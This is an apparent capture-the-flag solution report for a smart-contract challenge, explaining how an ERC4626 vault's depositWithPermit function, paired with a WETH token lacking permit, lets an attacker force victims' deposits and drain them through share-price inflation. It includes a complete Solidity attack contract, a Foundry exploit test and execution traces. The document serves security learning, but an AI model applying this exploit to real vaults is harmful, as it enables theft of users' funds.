# Challenge 5: Balloon Vault - Solution Report

## Problem Overview

### Contract Summary

The challenge involves two main contracts:

1. `BallonVault`: An ERC4626 compliant vault contract that allows users to deposit WETH tokens and receive shares in return.

   - Key function: `depositWithPermit()` - Allows depositing tokens using EIP-2612 permit functionality.

2. `WETH`: A wrapped Ether contract that allows users to deposit ETH and receive WETH tokens.
   - Key functions: `deposit()`, `withdraw()`, `transfer()`

### Initial Setup

- Attacker starts with 10 ETH
- Bob and Alice each have 500 WETH
- Bob and Alice have approved the vault to spend 500 WETH each

### Success Criteria

- Drain Bob's and Alice's wallets
- Attacker ends up with more than 1000 WETH in their wallet

## Vulnerability

The vulnerability in this challenge lies in the `depositWithPermit` function of the `BallonVault` contract:

```solidity
function depositWithPermit(address from, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s)
    external
{
    IERC20Permit(address(asset())).permit(from, address(this), amount, deadline, v, r, s);

    _deposit(from, from, amount, previewDepost(amount));
}
```

This function allows anyone to force a deposit from any address that has approved the vault to spend their tokens, even without a valid permit signature. This is because:

1. The WETH token used doesn't implement the `permit` function, so the call to `permit` always succeeds without setting any approvals.
2. The function doesn't verify that the `from` address actually signed the permit or approved the transaction.

As a result, an attacker can call this function to deposit WETH from Bob's and Alice's accounts into the vault without their consent, as long as they have previously approved the vault to spend their WETH (which they have in the initial setup). This vulnerability allows the attacker to manipulate the vault's balance and ultimately drain the WETH from Bob's and Alice's accounts.

## Attack Process

The attack exploits the vulnerability in the `depositWithPermit` function to drain WETH from Bob's and Alice's accounts. The process involves the following steps:

1. **Initial Setup**:

   - Deploy the attack contract with references to the WETH and BallonVault contracts.
   - Convert some of the attacker's ETH to WETH and transfer it to the attack contract.

2. **Attack Loop**: For each victim (Alice and Bob), repeat the following steps until their WETH balance is drained:

   a. **Minimal Deposit**:

   - Deposit 1 wei of WETH into the vault to receive 1 share.
   - This gives the attacker the ability to withdraw funds later.

   b. **Donation**:

   - Transfer the remaining WETH balance directly to the vault.
   - This artificially inflates the vault's total assets without minting new shares.

   c. **Forced Deposit**:

   - Call `depositWithPermit` to force a deposit from the victim's account.
   - The amount deposited is equal to the donation amount or the victim's entire balance, whichever is smaller.
   - This mints new shares for the victim based on the inflated asset total.

   d. **Withdrawal**:

   - Redeem the attacker's single share.
   - Due to the inflated asset total, this single share is now worth significantly more than the initial deposit.

3. **Final Withdrawal**:
   - After draining both Alice's and Bob's accounts, withdraw all WETH from the attack contract to the attacker's address.

This process allows the attacker to gradually extract WETH from the victims' accounts by manipulating the vault's share price. Each iteration of the loop transfers a portion of the victim's WETH to the attacker, eventually draining their entire balance.

## Proof of Concept (PoC)

### Core Implementation

The core of the attack is implemented in the `BallonVaultAttack` contract. Here's the main `attack` function that executes the exploit:

```solidity
function attack(address victim) external {
    require(msg.sender == attacker, "Only attacker can attack");
    require(weth.balanceOf(address(this)) > 0, "Contract has no WETH balance");
    require(weth.balanceOf(victim) > 0, "Victim has no WETH balance");

    while (weth.balanceOf(victim) > 0) {
        // Step 1: Deposit 1 wei to get 1 share
        weth.approve(address(vault), 1);
        vault.deposit(1, address(this));

        // Step 2: Transfer remaining balance directly to vault
        uint256 donationAmount = weth.balanceOf(address(this));
        weth.transfer(address(vault), donationAmount);

        // Step 3: Force victim's deposit
        uint256 victimBalance = weth.balanceOf(victim);
        uint256 amountToSteal = victimBalance < donationAmount ? victimBalance : donationAmount;
        vault.depositWithPermit(victim, amountToSteal, 0, 0, 0, 0);

        // Step 4: Withdraw all funds
        vault.redeem(1, address(this), address(this));
    }
}
```

The exploit is executed in the `testExploit` function of the `Challenge5Test` contract:

```solidity
function testExploit() public {
    vm.startPrank(attacker);

    // Deploy the attack contract
    BallonVaultAttack attackContract = new BallonVaultAttack(address(weth), address(vault));

    // send attacker 10 WETH to the attack contract
    weth.deposit{value: 10 ether}();
    weth.transfer(address(attackContract), 10 ether);

    // Attack alice to drain the WETH balance
    attackContract.attack(alice);

    // Attack bob to drain the WETH balance
    attackContract.attack(bob);

    // Withdraw all WETH to attacker
    attackContract.withdraw();

    vm.stopPrank();

    assertGt(weth.balanceOf(address(attacker)), 1000 ether, "Attacker should have more than 1000 ether");
}
```

### Running Result

```
Traces:
  [1772046] Challenge5Test::testExploit()
    ├─ [0] VM::startPrank(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
    │   └─ ← [Return]
    ├─ [509634] → new BallonVaultAttack@0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a
    │   └─ ← [Return] 2212 bytes of code
    ├─ [29362] WETH::deposit{value: 10000000000000000000}()
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], value: 10000000000000000000 [1e19])
    │   └─ ← [Stop]
    ├─ [24994] WETH::transfer(BallonVaultAttack: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], 10000000000000000000 [1e19])
    │   ├─ emit Transfer(from: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], to: BallonVaultAttack: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], value: 10000000000000000000 [1e19])
    │   └─ ← [Return] true
    ├─ [954045] BallonVaultAttack::attack(alice: [0x328809Bc894f92807417D2dAD6b7C998c1aFdac6])

// ...
// ...

    ├─ [24866] BallonVaultAttack::withdraw()
    │   ├─ [585] WETH::balanceOf(BallonVaultAttack: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a]) [staticcall]
    │   │   └─ ← [Return] 1010000000000000000000 [1.01e21]
    │   ├─ [22994] WETH::transfer(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], 1010000000000000000000 [1.01e21])
    │   │   ├─ emit Transfer(from: BallonVaultAttack: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], to: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], value: 1010000000000000000000 [1.01e21])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [585] WETH::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
    │   └─ ← [Return] 1010000000000000000000 [1.01e21]
    └─ ← [Stop]
```
